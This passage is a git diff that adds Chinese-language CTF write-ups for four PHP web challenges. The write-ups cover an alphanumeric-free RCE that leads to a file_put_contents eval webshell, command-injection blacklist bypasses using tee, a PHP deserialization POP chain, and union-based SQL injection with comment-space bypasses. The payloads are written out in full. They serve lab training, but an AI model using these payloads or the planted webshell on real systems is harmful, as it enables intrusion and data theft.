@@ -229,6 +229,126 @@ echo '(~'.urlencode(~$a).')(~'.urlencode(~$b).');';
 wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DB%B6%B9%AC%DB%CE%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
 ```
 
+### hardrce\_3
+
+```php
+<?php
+header("Content-Type:text/html;charset=utf-8");
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['wllm'])) {
+  $wllm = $_GET['wllm'];
+  $blacklist = [' ','\^','\~','\|'];
+  foreach ($blacklist as $blackitem) {
+    if (preg_match('/' . $blackitem . '/m', $wllm)) {
+      die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
+    }
+  }
+  if(preg_match('/[a-zA-Z0-9]/is',$wllm)) {
+    die("Ra'sAlGhul说用字母数字是没有灵魂的！");
+  }
+  echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
+  eval($wllm);
+} else {
+  echo "蔡总说：注意审题！！！";
+}
+?>
+```
+
+这是一道无字母数字 rce ，根据百度一番查找找到用自增的方法来解决
+
+> https://blog.csdn.net/qq\_61778128/article/details/127063407
+
+```
+<?php
+$_=[].'';   //得到"Array"
+$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
+$__ = $___;   //$__="A"
+$_ = $___;   //$_="A"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
+$___ .= $__;   //$___="AS"
+$___ .= $__;   //$___="ASS"
+$__ = $_;   //$__="A"
+$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
+$___ .= $__;   //$___="ASSE"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
+$___ .= $__;   //$___="ASSER"
+$__++;$__++;   //得到"T"，此时$__="T"
+$___ .= $__;   //$___="ASSERT"
+$__ = $_;   //$__="A"
+$____ = "_";   //$____="_"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
+$____ .= $__;   //$____="_P"
+$__ = $_;   //$__="A"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
+$____ .= $__;   //$____="_PO"
+$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
+$____ .= $__;   //$____="_POS"
+$__++;   //得到"T"，此时$__="T"
+$____ .= $__;   //$____="_POST"
+$_ = $$____;   //$_=$_POST
+$___($_[_]);
+```
+
+这里放一个压缩版（
+
+```php
+<?php
+$_=[].'';$___=$_[$__];$__=$___;$_=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;$___.=$__;$__++;$__++;$___.=$__;$__=$_;$____="_";$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__++;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);
+```
+
+将以上内容进行一次 Urlencode 编码得到以下内容，将其作为 Payload 。
+
+```
+wllm=%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%5F%5F%3D%24%5F%5B%24%5F%5F%5D%3B%24%5F%5F%3D%24%5F%5F%5F%3B%24%5F%3D%24%5F%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%5F%5F%3D%22%5F%22%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%24%5F%5F%5F%5F%3B%24%5F%5F%5F%28%24%5F%5B%5F%5D%29%3B
+```
+
+但是发现并没有用，通过百度看发现还需要利用 `file_put_contents()` 函数来绕过 disable\_function。
+
+所以需要构造 Payload 如下（body 部分）
+
+```
+_=file_put_contents('1.php','<?php eval($_POST[1]); ?>');
+```
+
+然后访问 `./1.php` 发现文件成功写入后尝试用蚁剑连接，连接成功后发现 flag 就在根目录 `/flag` 中。
+
+### finalrce
+
+```php
+<?php
+highlight_file(__FILE__);
+if(isset($_GET['url'])) {
+  $url=$_GET['url'];
+  if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url)) {
+    echo "Sorry,you can't use this.";
+  } else {
+    echo "Can you see anything?";
+    exec($url);
+  }
+}
+```
+
+通过 `tee` 和 管道符 可以将值输出到文件中，构造 Payload 如下
+
+```
+url=l\s / | tee 1.html
+```
+
+访问 `./1.html` 可以得到以下内容
+
+```
+a_here_is_a_f1ag bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+```
+
+构造以下 Payload 获取 flag ，需要注意 `la` 和 `cat` 被过滤了，需要使用 `\` 进行绕过
+
+```
+url=c\at /flllll\aaaaaaggggggg | tee 2.html
+```
+
+访问 `./2.html` 就可以得到 flag 了。
+
 ### Do\_you\_know\_http
 
 修改以下两项
@@ -582,3 +702,183 @@ Table: test_tb
 | NSSCTF{d9d7ae7c-5b01-461c-836a-4e0f784d9784} |
 +----------------------------------------------+
 ```
+
+### pop
+
+```php
+<?php
+
+error_reporting(0);
+show_source("index.php");
+
+class w44m{
+
+    private $admin = 'aaa';
+    protected $passwd = '123456';
+
+    public function Getflag(){
+        if($this->admin === 'w44m' && $this->passwd ==='08067'){
+            include('flag.php');
+            echo $flag;
+        }else{
+            echo $this->admin;
+            echo $this->passwd;
+            echo 'nono';
+        }
+    }
+}
+
+class w22m{
+    public $w00m;
+    public function __destruct(){
+        echo $this->w00m;
+    }
+}
+
+class w33m{
+    public $w00m;
+    public $w22m;
+    public function __toString(){
+        $this->w00m->{$this->w22m}();
+        return 0;
+    }
+}
+
+$w00m = $_GET['w00m'];
+unserialize($w00m);
+
+?>
+```
+
+先构造序列化
+
+```php
+<?php
+class w44m{
+
+  private $admin = 'aaa';
+
+  public function setAdmin(string $admin): void
+  {
+    $this->admin = $admin;
+  }
+
+  public function setPasswd(string $passwd): void
+  {
+    $this->passwd = $passwd;
+  }
+  protected $passwd = '123456';
+
+  public function Getflag(){
+    if($this->admin === 'w44m' && $this->passwd ==='08067'){
+      include('flag.php');
+      echo $flag;
+    }else{
+      echo $this->admin;
+      echo $this->passwd;
+      echo 'nono';
+    }
+  }
+}
+
+class w22m{
+  public $w00m;
+  public function __destruct(){
+    echo $this->w00m;
+  }
+}
+
+class w33m{
+  public $w00m;
+  public $w22m;
+  public function __toString(){
+    $this->w00m->{$this->w22m}();
+    return 0;
+  }
+}
+
+$a = new w22m();
+$b = new w33m();
+$c = new w44m();
+$a->w00m = $b;
+$b->w00m = $c;
+$b->w22m = 'Getflag';
+$c->setAdmin('w44m');
+$c->setPasswd('08067');
+echo urlencode(serialize($a));
+// O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
+```
+
+之后构造 Payload 如下即可得到 flag 。
+
+```
+w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
+```
+
+### sql
+
+题目中说明需要绕过 Waf ，那就先判断被过滤的字符，构造 Payload 如下
+
+```
+wllm=1' and 1=1%23
+wllm=1'||1=1%23
+wllm=1' or 1%23
+```
+
+回显提示存在非法字符，
+
+```
+wllm=1'||1#
+```
+
+此时回显并没有提示存在非法字符，可以推断出过滤了 `=` 和 `空格` 。
+
+构造 Payload 如下
+
+```
+wllm=1'/**/order/**/by/**/1%23
+wllm=1'/**/order/**/by/**/2%23
+wllm=1'/**/order/**/by/**/3%23
+wllm=1'/**/order/**/by/**/4%23
+```
+
+到 `4` 时出现报错，因此长度为 `3` 。
+
+构造 Payload 如下
+
+```
+wllm=-1'/**/union/**/select/**/1,2,3%23
+```
+
+可以发现 `2,3` 有回显，构造 Payload 如下
+
+```
+wllm=-1'/**/union/**/select/**/1,database(),3%23
+```
+
+可以得到数据库名 `test_db` ，构造 Payload 如下
+
+```
+wllm=-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'),3%23
+```
+
+可以得到表名 `LTLT_flag, users` ，构造 Payload 如下（插曲：发现 and 也被过滤了）
+
+```
+wllm=-1'/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'test_db'),3%23
+```
+
+可以得到列名 `id, flag, id, username` ，构造 Payload 如下
+
+```
+wllm=-1'/**/union/**/select/**/1,(select/**/flag/**/from/**/LTLT_flag/**/limit/**/0,1),3%23
+```
+
+可以得到 `NSSCTF{aeb148da-5efa` ，可以通过 `mid()` 来获取 flag 的其他部分，构造 Payload 如下
+
+```
+wllm=-1'/**/union/**/select/**/1,mid((select/**/flag/**/from/**/LTLT_flag/**/limit/**/0,1),21),3%23
+wllm=-1'/**/union/**/select/**/1,mid((select/**/flag/**/from/**/LTLT_flag/**/limit/**/0,1),40),3%23
+```
+
+可以得到 `-430e-961b-ab03b3fb` 和 `2d32}` 拼起来就是 flag 了。
